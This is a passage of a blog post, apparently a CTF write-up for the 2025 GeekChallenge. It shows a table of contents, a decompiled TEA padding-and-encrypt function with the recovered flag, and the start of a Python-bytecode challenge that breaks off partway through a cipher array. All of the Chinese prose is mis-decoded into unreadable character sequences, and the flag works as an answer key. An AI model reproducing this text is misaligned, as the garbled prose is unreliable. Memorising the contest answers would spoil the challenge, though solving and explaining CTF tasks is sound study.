<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="re 1.encode è¯¥é¢˜å¦‚æœç†è§£çš„é¢˜ç›®çš„æ„æ€æœ¬èº«æ²¡ä»€ä¹ˆéš¾åº¦ï¼Œä¸»è¦æ˜¯è¿ç”¨äº†å¿ƒç†å­¦åŸç†è—èµ·æ¥åŠ å¯†å‡½æ•°ï¼Œè¯¥é¢˜çš„scanfå‡½æ•°æ˜¯é¢˜è€…å†™çš„ï¼Œæ‰€ä»¥scanfè—äº†ä¸€ä¸ªencå‡½æ•°(å¯çŸ¥ä¸ºä¸€ä¸ªTEAåŠ å¯†)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 __int64 __fastcall enc(__int64 a1, int a2, __int64 a3) { int v4; // [xsp+10h] [xbp-140h] int v5; // [xsp+14h] [xbp-13Ch] int m; // [xsp+18h] [xbp-138h] int i; // [xsp+1Ch] [xbp-134h] int j; // [xsp+1Ch] [xbp-134h] int k; // [xsp+1Ch] [xbp-134h] _BYTE v11[256]; // [xsp+38h] [xbp-118h] v5 = 8 - a2 % 8; v4 = a2 + v5; for ( i = 0; i &lt; a2; ++i ) v11[i] = *(_BYTE *)(a1 + i); for ( j = a2; j &lt; v4; ++j ) v11[j] = v5; for ( k = 0; k &lt; v4; k += 8 ) { for ( m = 0; m &lt; 8; ++m ) *(_BYTE *)(a3 + k + m) = v11[k + m]; enc_block(a3 + k, (__int64)&amp;a); } return (unsigned int)v4; } mainå‡½æ•°ä¸­è¿˜æœ‰ä¸€ä¸ªå¼‚æˆ–å’Œbsae64ï¼Œç®€å•æŸ¥æ‰¾å¯å¾—å¯†æ–‡å’Œæ˜ å°„è¡¨\n">
<title>2025geekchallenge Wp</title>

<link rel='canonical' href='https://linye9999.github.io/p/2025geekchallenge-wp/'>

<link rel="stylesheet" href="/scss/style.min.b0e76e98cdd4f7082d1fc36f7af7e0843a81201db2197c03ca426751dc923735.css"><meta property='og:title' content="2025geekchallenge Wp">
<meta property='og:description' content="re 1.encode è¯¥é¢˜å¦‚æœç†è§£çš„é¢˜ç›®çš„æ„æ€æœ¬èº«æ²¡ä»€ä¹ˆéš¾åº¦ï¼Œä¸»è¦æ˜¯è¿ç”¨äº†å¿ƒç†å­¦åŸç†è—èµ·æ¥åŠ å¯†å‡½æ•°ï¼Œè¯¥é¢˜çš„scanfå‡½æ•°æ˜¯é¢˜è€…å†™çš„ï¼Œæ‰€ä»¥scanfè—äº†ä¸€ä¸ªencå‡½æ•°(å¯çŸ¥ä¸ºä¸€ä¸ªTEAåŠ å¯†)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 __int64 __fastcall enc(__int64 a1, int a2, __int64 a3) { int v4; // [xsp+10h] [xbp-140h] int v5; // [xsp+14h] [xbp-13Ch] int m; // [xsp+18h] [xbp-138h] int i; // [xsp+1Ch] [xbp-134h] int j; // [xsp+1Ch] [xbp-134h] int k; // [xsp+1Ch] [xbp-134h] _BYTE v11[256]; // [xsp+38h] [xbp-118h] v5 = 8 - a2 % 8; v4 = a2 + v5; for ( i = 0; i &lt; a2; ++i ) v11[i] = *(_BYTE *)(a1 + i); for ( j = a2; j &lt; v4; ++j ) v11[j] = v5; for ( k = 0; k &lt; v4; k += 8 ) { for ( m = 0; m &lt; 8; ++m ) *(_BYTE *)(a3 + k + m) = v11[k + m]; enc_block(a3 + k, (__int64)&amp;a); } return (unsigned int)v4; } mainå‡½æ•°ä¸­è¿˜æœ‰ä¸€ä¸ªå¼‚æˆ–å’Œbsae64ï¼Œç®€å•æŸ¥æ‰¾å¯å¾—å¯†æ–‡å’Œæ˜ å°„è¡¨\n">
<meta property='og:url' content='https://linye9999.github.io/p/2025geekchallenge-wp/'>
<meta property='og:site_name' content='linye'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-12-16T15:12:33&#43;08:00'/><meta property='article:modified_time' content='2025-12-16T15:12:33&#43;08:00'/><meta property='og:image' content='https://linye9999.github.io/p/2025geekchallenge-wp/cover.jpg' />
<meta name="twitter:title" content="2025geekchallenge Wp">
<meta name="twitter:description" content="re 1.encode è¯¥é¢˜å¦‚æœç†è§£çš„é¢˜ç›®çš„æ„æ€æœ¬èº«æ²¡ä»€ä¹ˆéš¾åº¦ï¼Œä¸»è¦æ˜¯è¿ç”¨äº†å¿ƒç†å­¦åŸç†è—èµ·æ¥åŠ å¯†å‡½æ•°ï¼Œè¯¥é¢˜çš„scanfå‡½æ•°æ˜¯é¢˜è€…å†™çš„ï¼Œæ‰€ä»¥scanfè—äº†ä¸€ä¸ªencå‡½æ•°(å¯çŸ¥ä¸ºä¸€ä¸ªTEAåŠ å¯†)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 __int64 __fastcall enc(__int64 a1, int a2, __int64 a3) { int v4; // [xsp+10h] [xbp-140h] int v5; // [xsp+14h] [xbp-13Ch] int m; // [xsp+18h] [xbp-138h] int i; // [xsp+1Ch] [xbp-134h] int j; // [xsp+1Ch] [xbp-134h] int k; // [xsp+1Ch] [xbp-134h] _BYTE v11[256]; // [xsp+38h] [xbp-118h] v5 = 8 - a2 % 8; v4 = a2 + v5; for ( i = 0; i &lt; a2; ++i ) v11[i] = *(_BYTE *)(a1 + i); for ( j = a2; j &lt; v4; ++j ) v11[j] = v5; for ( k = 0; k &lt; v4; k += 8 ) { for ( m = 0; m &lt; 8; ++m ) *(_BYTE *)(a3 + k + m) = v11[k + m]; enc_block(a3 + k, (__int64)&amp;a); } return (unsigned int)v4; } mainå‡½æ•°ä¸­è¿˜æœ‰ä¸€ä¸ªå¼‚æˆ–å’Œbsae64ï¼Œç®€å•æŸ¥æ‰¾å¯å¾—å¯†æ–‡å’Œæ˜ å°„è¡¨\n"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://linye9999.github.io/p/2025geekchallenge-wp/cover.jpg' />
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_381de9de90108543.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ¥</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">linye</a></h1>
            <h2 class="site-description">æ¬¢è¿æ¥åˆ°æˆ‘çš„åšå®¢è¿™é‡Œå•¥éƒ½æ²¡æœ‰ï¼Œè¿˜æœ‰linyeæ˜¯ç»«å¤œ</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>å‹æƒ…é“¾æ¥</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">
                    
                        <li id="i18n-switch">  
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
                                
                                    <option value="https://linye9999.github.io/en/" >English</option>
                                
                                    <option value="https://linye9999.github.io/" selected>ç®€ä½“ä¸­æ–‡</option>
                                
                                    <option value="https://linye9999.github.io/ar/" >Ø¹Ø±Ø¨ÙŠ</option>
                                
                            </select>
                        </li>
                    
                

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li>
      <ol>
        <li><a href="#1encode">1.encode</a></li>
        <li><a href="#2ez_pyyy">2.ez_pyyy</a></li>
        <li><a href="#3only_flower">3.only_flower</a></li>
        <li><a href="#4ezru3t">4.ezRu3t</a></li>
        <li><a href="#5ezsmc">5.ezSMC</a></li>
        <li><a href="#6qyqsã®å¥‡å¦™å†’é™©">6.QYQSã®å¥‡å¦™å†’é™©</a></li>
        <li><a href="#7gensh1n">7.Gensh1n</a></li>
        <li><a href="#8mission-ghostsignal">8.Mission GhostSignal</a></li>
        <li><a href="#9qyqsã®å¥‡å¦™å†’é™©2">9.QYQSã®å¥‡å¦™å†’é™©2</a></li>
        <li><a href="#10stack_bomb">10.stack_bomb</a></li>
        <li><a href="#11ez_vm">11.ez_vm</a></li>
        <li><a href="#12geekbinder">12.GeekBinder</a></li>
        <li><a href="#13å›½äº§ã®å…‰">13.å›½äº§ã®å…‰</a></li>
        <li><a href="#14lastone">14.Lastone</a></li>
        <li><a href="#15obfuscat3">15.obfuscat3</a></li>
      </ol>
    </li>
  </ol>

  <ol>
    <li>
      <ol>
        <li><a href="#16mission-calculator">16.Mission Calculator</a></li>
        <li><a href="#17mission-cipher-text">17.Mission Cipher Text</a></li>
        <li><a href="#18æ¬¡å…ƒå›šç¬¼">18.æ¬¡å…ƒå›šç¬¼</a></li>
      </ol>
    </li>
  </ol>

  <ol>
    <li>
      <ol>
        <li><a href="#19">19.ğŸ—ƒï¸ğŸ—ƒï¸</a></li>
        <li><a href="#20bite-off-picture">20.Bite off picture</a></li>
        <li><a href="#21blockchain-signin">21.Blockchain SignIn</a></li>
        <li><a href="#221z_sign">22.1Z_Sign</a></li>
        <li><a href="#23dream">23.Dream</a></li>
        <li><a href="#24hidden">24.hidden</a></li>
        <li><a href="#25gift">25.gift</a></li>
        <li><a href="#264ak5ra">26.4ak5ra</a></li>
        <li><a href="#27é—®å·">27.é—®å·</a></li>
        <li><a href="#28http">28.HTTP</a></li>
      </ol>
    </li>
  </ol>

  <ol>
    <li>
      <ol>
        <li><a href="#29ez_xor">29.ez_xor</a></li>
        <li><a href="#30caesar-slot-machine">30.Caesar Slot Machine</a></li>
        <li><a href="#31pem">31.pem</a></li>
        <li><a href="#32baby_rabin">32.baby_rabin</a></li>
        <li><a href="#33dp_spill">33.dp_spill</a></li>
        <li><a href="#34s_box">34.S_box</a>
          <ol>
            <li></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>

  <ol>
    <li>
      <ol>
        <li><a href="#35é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ">35.é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ</a></li>
        <li><a href="#36vibe-seo">36.Vibe SEO</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/2025geekchallenge-wp/">
                <img src="/p/2025geekchallenge-wp/cover_hu_624906197ea73ab0.jpg"
                        srcset="/p/2025geekchallenge-wp/cover_hu_624906197ea73ab0.jpg 800w, /p/2025geekchallenge-wp/cover_hu_2f9fc7ba373e568c.jpg 1600w"
                        width="800" 
                        height="1132" 
                        loading="lazy"
                        alt="Featured image of post 2025geekchallenge Wp" />
                
            </a>
        </div>
    

    <div class="article-details">
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/2025geekchallenge-wp/">2025geekchallenge Wp</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published" datetime='2025-12-16T15:12:33&#43;08:00'>Dec 16, 2025</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="re">re
</h1><h3 id="1encode">1.encode
</h3><ul>
<li>
<p>è¯¥é¢˜å¦‚æœç†è§£çš„é¢˜ç›®çš„æ„æ€æœ¬èº«æ²¡ä»€ä¹ˆéš¾åº¦ï¼Œä¸»è¦æ˜¯è¿ç”¨äº†å¿ƒç†å­¦åŸç†è—èµ·æ¥åŠ å¯†å‡½æ•°ï¼Œè¯¥é¢˜çš„scanfå‡½æ•°æ˜¯é¢˜è€…å†™çš„ï¼Œæ‰€ä»¥scanfè—äº†ä¸€ä¸ªencå‡½æ•°(å¯çŸ¥ä¸ºä¸€ä¸ªTEAåŠ å¯†)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">enc</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [xsp+10h] [xbp-140h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [xsp+14h] [xbp-13Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">m</span><span class="p">;</span> <span class="c1">// [xsp+18h] [xbp-138h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [xsp+1Ch] [xbp-134h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [xsp+1Ch] [xbp-134h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">k</span><span class="p">;</span> <span class="c1">// [xsp+1Ch] [xbp-134h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="n">v11</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span> <span class="c1">// [xsp+38h] [xbp-118h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">-</span> <span class="n">a2</span> <span class="o">%</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">a2</span> <span class="o">+</span> <span class="n">v5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">a2</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">v11</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">v4</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">v11</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">v4</span><span class="p">;</span> <span class="n">k</span> <span class="o">+=</span> <span class="mi">8</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">m</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="o">++</span><span class="n">m</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a3</span> <span class="o">+</span> <span class="n">k</span> <span class="o">+</span> <span class="n">m</span><span class="p">)</span> <span class="o">=</span> <span class="n">v11</span><span class="p">[</span><span class="n">k</span> <span class="o">+</span> <span class="n">m</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">enc_block</span><span class="p">(</span><span class="n">a3</span> <span class="o">+</span> <span class="n">k</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>mainå‡½æ•°ä¸­è¿˜æœ‰ä¸€ä¸ªå¼‚æˆ–å’Œbsae64ï¼Œç®€å•æŸ¥æ‰¾å¯å¾—å¯†æ–‡å’Œæ˜ å°„è¡¨</p>
</li>
<li>
<p>è§£å¯†å¯å¾—SYC{St4nd4rd_Funct10n_N0t_4lw4ys_St4nd4rd}</p>
</li>
</ul>
<h3 id="2ez_pyyy">2.ez_pyyy
</h3><ul>
<li>
<p>ä¸‹è½½é™„ä»¶å‘ç°è·å¾—äº†.pycæ–‡ä»¶</p>
</li>
<li>
<p>æ‰¾ä¸€ä¸ªåœ¨çº¿åç¼–è¯‘ç½‘ç«™ï¼Œåç¼–è¯‘è·å¾—pyä»£ç </p>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="mi">48</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mi">52</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span>
